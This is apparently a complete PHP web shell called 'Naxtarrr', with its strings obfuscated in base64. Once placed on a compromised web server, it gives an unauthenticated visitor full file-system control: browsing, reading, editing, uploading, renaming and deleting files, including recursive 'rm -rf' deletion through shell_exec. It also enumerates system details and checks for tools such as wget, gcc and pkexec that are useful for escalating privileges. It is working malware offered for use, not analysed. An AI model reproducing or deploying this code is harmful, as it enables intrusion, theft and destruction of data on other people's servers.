<!DOCTYPE html>
<html>

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nx</title>
  <link rel="stylesheet" href="https://naxtarrr.netlify.app/assets/css/shell_style2.css">
</head>

<body>
  <?php $m3=(isset($_GET[base64_decode('cGF0aA==')]))?$_GET[base64_decode('cGF0aA==')]:getcwd();$o4=(isset($_GET[base64_decode('ZmlsZQ==')]))?$_GET[base64_decode('ZmlsZQ==')]:'';$q5=php_uname(base64_decode('cw=='));$y6=($q5===base64_decode('V2luZG93cw=='))?base64_decode('XA=='):base64_decode('Lw==');$e7=explode($y6,$m3);?>

  <div class="container">
    <div class="infomin">
      <div class="order-2">
        <a href="?" class="home">Naxtarrr</a>
      </div>
      <div class="order-1">
        <?php $f8=(function_exists(base64_decode('Y3VybF92ZXJzaW9u')))?base64_decode('PGZvbnQgY29sb3I9J2xpbWUnPk9OPC9mb250Pg=='):base64_decode('PGZvbnQgY29sb3I9J3JlZCc+T0ZGPC9mb250Pg==');$m9=(@shell_exec(base64_decode('d2dldCAtLWhlbHA=')))?base64_decode('PGZvbnQgY29sb3I9J2xpbWUnPk9OPC9mb250Pg=='):base64_decode('PGZvbnQgY29sb3I9J3JlZCc+T0ZGPC9mb250Pg==');$ja=(@shell_exec(base64_decode('cHl0aG9uIC0taGVscA==')))?base64_decode('PGZvbnQgY29sb3I9J2xpbWUnPk9OPC9mb250Pg=='):base64_decode('PGZvbnQgY29sb3I9J3JlZCc+T0ZGPC9mb250Pg==');$db=(@shell_exec(base64_decode('cGVybCAtLWhlbHA=')))?base64_decode('PGZvbnQgY29sb3I9J2xpbWUnPk9OPC9mb250Pg=='):base64_decode('PGZvbnQgY29sb3I9J3JlZCc+T0ZGPC9mb250Pg==');$jc=(@shell_exec(base64_decode('cnVieSAtLWhlbHA=')))?base64_decode('PGZvbnQgY29sb3I9J2xpbWUnPk9OPC9mb250Pg=='):base64_decode('PGZvbnQgY29sb3I9J3JlZCc+T0ZGPC9mb250Pg==');$sd=(@shell_exec(base64_decode('Z2NjIC0taGVscA==')))?base64_decode('PGZvbnQgY29sb3I9J2xpbWUnPk9OPC9mb250Pg=='):base64_decode('PGZvbnQgY29sb3I9J3JlZCc+T0ZGPC9mb250Pg==');$ue=(@shell_exec(base64_decode('cGtleGVjIC0tdmVyc2lvbg==')))?base64_decode('PGZvbnQgY29sb3I9J2xpbWUnPk9OPC9mb250Pg=='):base64_decode('PGZvbnQgY29sb3I9J3JlZCc+T0ZGPC9mb250Pg==');$vf=@ini_get(base64_decode('ZGlzYWJsZV9mdW5jdGlvbnM='));$e10=(!empty($vf))?"<font color='red'>$vf</font>":base64_decode('PGZvbnQgY29sb3I9J2xpbWUnPk5PTkU8L2ZvbnQ+');?>
        <span>System Info: <?= php_uname();?></span>
        <span>PHP Version: <?= phpversion();?></span>
        <span style="width: 100%; max-width: 350px;">CURL: <?= $f8;?>, WGET: <?= $m9;?>, PERL: <?= $db;?>, RUBY: <?= $jc;?>, GCC: <?= $sd;?>, PKEXEC: <?= $ue;?></span>
        <span>Disabled Functions: <?= $e10;?></span>
      </div>
    </div>

    <div class="navigation">
      <?php if(isset($_GET[base64_decode('ZmlsZQ==')])&&!isset($_GET[base64_decode('cGF0aA==')])){$m3=dirname($_GET[base64_decode('ZmlsZQ==')]);}$m3=str_replace(base64_decode('XA=='),base64_decode('Lw=='),$m3);$w11=explode(base64_decode('Lw=='),$m3);echo base64_decode('Q3VycmVudCBQYXRoOiA=');foreach($w11 as $p12=>$w13){echo base64_decode('PGEgaHJlZj0nP3BhdGg9');for($t14=0;$t14<=$p12;$t14++){echo $w11[$t14];if($t14!=$p12){echo base64_decode('Lw==');}}echo"'>$w13</a>/";}?>
    </div>
    <?php if($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')]===base64_decode('UE9TVA==')){if(isset($_FILES[base64_decode('bmF4X2ZpbGU=')])){$o4=basename($_FILES[base64_decode('bmF4X2ZpbGU=')][base64_decode('bmFtZQ==')]);$v15=$m3.$y6.$o4;if(move_uploaded_file($_FILES[base64_decode('bmF4X2ZpbGU=')][base64_decode('dG1wX25hbWU=')],$v15)){echo"<script>alert('$o4 uploaded'); window.location = '?path=$m3';</script>";}else{echo"<script>alert('Upload failed'); window.location = '?path=$m3';</script>";}}}if(!isset($_GET[base64_decode('YQ==')])):if(is_readable($m3)):?>

      <div class="table-container">
        <table>
          <thead>
            <tr>
              <th>Name</th>
              <th>Size</th>
              <th>Permission</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            <?php foreach(scandir($m3)as $z16){if(!is_dir($m3.$y6.$z16)||$z16===base64_decode('Li4=')||$z16===base64_decode('Lg=='))continue;$w17=(is_writable($m3.$y6.$z16))?base64_decode('dGV4dC1ncmVlbg=='):base64_decode('dGV4dC1yZWQ=');?>
              <tr>
                <td width="450">
                  <a href='?path=<?= $m3.$y6.$z16;?>'>
                    <?= $z16;?>
                  </a>
                </td>
                <td width="70">---</td>
                <td width="80" class="<?= $w17;?>"><?= n2($m3.$y6.$z16);?></td>
                <td width="90">
                  <a href='?path=<?= $m3.$y6.$z16;?>&a=rename'>
                    Rename
                  </a>
                  <a href='?path=<?="$m3$y6$z16";?>&a=delete' onclick="return confirm('Delete folder <?= $z16;?>?')">
                    Delete
                  </a>
                </td>
              </tr>
              <?php }foreach(scandir($m3)as $z16){if(is_file($m3.$y6.$z16)){$w17=(is_writable($m3.$y6.$z16))?base64_decode('dGV4dC1ncmVlbg=='):base64_decode('dGV4dC1yZWQ=');?>
                <tr>
                  <td width="450">
                    <a href='?file=<?="$m3$y6$z16&a=view";?>'>
                      <?= $z16;?>
                    </a>
                  </td>
                  <td width="70"><?= c1("$m3$y6$z16");?></td>
                  <td width="80" class="<?= $w17;?>"><?= n2($m3.$y6.$z16);?></td>
                  <td width="90">
                    <a href='?file=<?="$m3$y6$z16";?>&a=editFile'>
                      Edit
                    </a>
                    <a href='?file=<?="$m3$y6$z16";?>&a=rename'>
                      Rename
                    </a>
                    <a href='?file=<?="$m3$y6$z16";?>&a=delete' onclick="return confirm('Delete file <?= $z16;?>?')">
                      Delete
                    </a>
                  </td>
                </tr>
            <?php }}?>
          </tbody>
        </table>
      </div>
    <?php else:echo base64_decode('VGhpcyBkaXJlY3RvcnkncyBub3QgcmVhZGFibGU=');endif;endif;if(isset($_GET[base64_decode('YQ==')])&&$_GET[base64_decode('YQ==')]==base64_decode('dmlldw==')){$q18=basename($_GET[base64_decode('ZmlsZQ==')]);?>
      <div class="card">
        <span style="display: block; margin-bottom: 10px;">Filename: <?= $q18;?></span>
        <textarea><?= htmlspecialchars(file_get_contents($o4));?></textarea>
      </div>
    <?php }elseif(isset($_GET[base64_decode('YQ==')])&&$_GET[base64_decode('YQ==')]==base64_decode('Y3JlYXRlRmlsZQ==')){?>
      <div class="card">
        <form method="post">
          <div class="mb-1">
            <label for="filename" class="label-form">Filename: </label>
            <input type="text" name="filename" id="filename" placeholder="file.txt" required>
          </div>
          <div class="mb-1">
            <label for="content" class="label-form">Content: </label>
            <textarea name="content" id="content"></textarea>
          </div>
          <button type="submit" class="btn-primary">Submit</button>
        </form>
      </div>
      <?php if(isset($_POST[base64_decode('ZmlsZW5hbWU=')])){$q18=$_POST[base64_decode('ZmlsZW5hbWU=')];$z19=base64_encode($_POST[base64_decode('Y29udGVudA==')]);if(g0($m3.$y6.$q18,$z19)){echo"<script>alert('$q18 Created'); window.location = '?path=$m3';</script>";}else{echo base64_decode('RmFpbGVkIHRvIGNyZWF0ZQ==');}}}elseif(isset($_GET[base64_decode('YQ==')])&&$_GET[base64_decode('YQ==')]==base64_decode('Y3JlYXRlRm9sZGVy')){?>
      <div class="card">
        <form method="post">
          <div class="mb-1">
            <label for="foldername" class="label-form">Folder Name: </label>
            <input type="text" name="foldername" id="foldername" placeholder="folder" required>
          </div>
          <button type="submit" class="btn-primary">Submit</button>
        </form>
      </div>
      <?php if(isset($_POST[base64_decode('Zm9sZGVybmFtZQ==')])){$v1a=$_POST[base64_decode('Zm9sZGVybmFtZQ==')];echo(mkdir($m3.$y6.$v1a))?"<script>alert('$v1a Created'); window.location = '?path=$m3';</script>":base64_decode('RmFpbGVkIHRvIGNyZWF0ZQ==');}}elseif(isset($_GET[base64_decode('YQ==')])&&$_GET[base64_decode('YQ==')]==base64_decode('ZWRpdEZpbGU=')){$o4=basename($_GET[base64_decode('ZmlsZQ==')]);?>
      <div class="card">
        <form method="post">
          <label for="content" class="label-form">Filename: <?= $o4;?></label>
          <textarea name="content" id="content"><?= htmlspecialchars(file_get_contents($_GET[base64_decode('ZmlsZQ==')]))?></textarea><br>
          <button type="submit" class="btn-primary">Submit</button>
        </form>
      </div>
      <?php if(isset($_POST[base64_decode('Y29udGVudA==')])){$z19=base64_encode($_POST[base64_decode('Y29udGVudA==')]);if(g0($m3.$y6.$o4,$z19)){$q18=basename($o4);echo"<script>alert('$q18 Edited'); window.location = '?path=$m3';</script>";}else{echo base64_decode('RmFpbGVkIHRvIGNyZWF0ZQ==');}}}elseif(isset($_GET[base64_decode('YQ==')])&&$_GET[base64_decode('YQ==')]==base64_decode('ZGVsZXRl')){if(!empty($_GET[base64_decode('ZmlsZQ==')])){$q18=basename($o4);if(unlink($o4)){echo"<script>alert('$q18 Deleted'); window.location = '?path=".dirname($_GET[base64_decode('ZmlsZQ==')]).base64_decode('Jzs8L3NjcmlwdD4=');}else{echo"Delete $q18 failed";}}else{$z1b=basename($m3);if(is_writable($m3)){@rmdir($m3);@shell_exec("rm -rf \"$m3\"");@shell_exec("rmdir /s /q \"$m3\"");echo"<script>alert('$z1b Deleted'); window.location = '?path=".dirname($m3).base64_decode('Jzs8L3NjcmlwdD4=');}else{echo"Delete $z1b failed";}}}elseif(isset($_GET[base64_decode('YQ==')])&&$_GET[base64_decode('YQ==')]==base64_decode('cmVuYW1l')){$f1c=(isset($_GET[base64_decode('ZmlsZQ==')]))?basename($_GET[base64_decode('ZmlsZQ==')]):basename($_GET[base64_decode('cGF0aA==')]);?>
      <div class="card">
        <form method="post">
          <div class="mb-1">
            <label for="newname" class="label-form">New Name: </label>
            <input type="text" name="newname" id="newname" value="<?= $f1c;?>" required>
          </div>
          <button type="submit" class="btn-primary">Submit</button>
        </form>
      </div>
    <?php if(isset($_POST[base64_decode('bmV3bmFtZQ==')])){$n1d=$_POST[base64_decode('bmV3bmFtZQ==')];$m3=(isset($_GET[base64_decode('ZmlsZQ==')]))?dirname($_GET[base64_decode('ZmlsZQ==')]):dirname($_GET[base64_decode('cGF0aA==')]);if(rename($m3.$y6.$f1c,$m3.$y6.$n1d)){echo"<script>alert('$f1c renamed to $n1d'); window.location = '?path=$m3';</script>";}else{base64_decode('RmFpbGVkIHRvIHJlbmFtZQ==');}}}?>
  </div>
  <?php function g0($o4,$z19){if($z19==''){$z19=base64_encode(base64_decode('ZW1wdHk='));}$c1e=fopen($o4,base64_decode('dw=='));$l1f=fwrite($c1e,base64_decode($z19));fclose($c1e);return($l1f)?true:false;}function c1($m3){$b20=filesize($m3);$s21=array(base64_decode('Qg=='),base64_decode('S0I='),base64_decode('TUI='),base64_decode('R0I='));$b22=0;while($b20>=1024&&$b22<count($s21)-1){$b20/=1024;$b22++;}return round($b20,2).base64_decode('IA==').$s21[$b22];}function n2($z16){$w23=fileperms($z16);if(($w23&0xC000)==0xC000){$x24=base64_decode('cw==');}elseif(($w23&0xA000)==0xA000){$x24=base64_decode('bA==');}elseif(($w23&0x8000)==0x8000){$x24=base64_decode('LQ==');}elseif(($w23&0x6000)==0x6000){$x24=base64_decode('Yg==');}elseif(($w23&0x4000)==0x4000){$x24=base64_decode('ZA==');}elseif(($w23&0x2000)==0x2000){$x24=base64_decode('Yw==');}elseif(($w23&0x1000)==0x1000){$x24=base64_decode('cA==');}else{$x24=base64_decode('dQ==');}$x24.=(($w23&0x0100)?base64_decode('cg=='):base64_decode('LQ=='));$x24.=(($w23&0x0080)?base64_decode('dw=='):base64_decode('LQ=='));$x24.=(($w23&0x0040)?(($w23&0x0800)?base64_decode('cw=='):base64_decode('eA==')):(($w23&0x0800)?base64_decode('Uw=='):base64_decode('LQ==')));$x24.=(($w23&0x0020)?base64_decode('cg=='):base64_decode('LQ=='));$x24.=(($w23&0x0010)?base64_decode('dw=='):base64_decode('LQ=='));$x24.=(($w23&0x0008)?(($w23&0x0400)?base64_decode('cw=='):base64_decode('eA==')):(($w23&0x0400)?base64_decode('Uw=='):base64_decode('LQ==')));$x24.=(($w23&0x0004)?base64_decode('cg=='):base64_decode('LQ=='));$x24.=(($w23&0x0002)?base64_decode('dw=='):base64_decode('LQ=='));$x24.=(($w23&0x0001)?(($w23&0x0200)?base64_decode('dA=='):base64_decode('eA==')):(($w23&0x0200)?base64_decode('VA=='):base64_decode('LQ==')));return $x24;}?>
  <div class='menu'>
    <input class='toggle' id='menu' type='checkbox' style="display: none;">

    <div class="menu-list">
      <a href="?path=<?= $m3;?>&a=createFile">Create File</a>
      <a href="?path=<?= $m3;?>&a=createFolder">Create Folder</a>
      <label for="naxx">Upload File</label>
      <label for="mode-toggle" class="no-select">
        <span>Dark Mode</span>
        <input type="checkbox" id="mode-toggle" class="d-hidden">
      </label>
    </div>

    <label class='btn-primary menu-toggle' for='menu'>
      Open Menu
    </label>

    <form method="POST" enctype="multipart/form-data" id="upload" class="d-hidden">
      <input type="file" name="nax_file" id="naxx">
    </form>
  </div>
  <script>
    const uploadInput = document.querySelector("#naxx");
    uploadInput.addEventListener("change", () => {
      const uploadForm = document.querySelector("#upload");
      uploadForm.submit();
    });


    const mode = localStorage.getItem("mode") || "light";

    const modeToggle = document.querySelector("#mode-toggle");
    const modeToggleLabel = document.querySelector("[for=mode-toggle] span");
    const body = document.body;

    if (mode === "dark") {
      body.classList.add("dark");
      modeToggle.checked = true;
      modeToggleLabel.innerText = "Light Mode";
    } else {
      body.classList.remove("dark");
      modeToggle.checked = false;
      modeToggleLabel.innerText = "Dark Mode";
    }

    modeToggle.addEventListener("change", () => {
      if (modeToggle.checked) {
        localStorage.setItem("mode", "dark");
        body.classList.add("dark");
        modeToggleLabel.innerText = "Light Mode";
      } else {
        localStorage.setItem("mode", "light");
        body.classList.remove("dark");
        modeToggleLabel.innerText = "Dark Mode";
      }
    });
  </script>
</body>

</html>
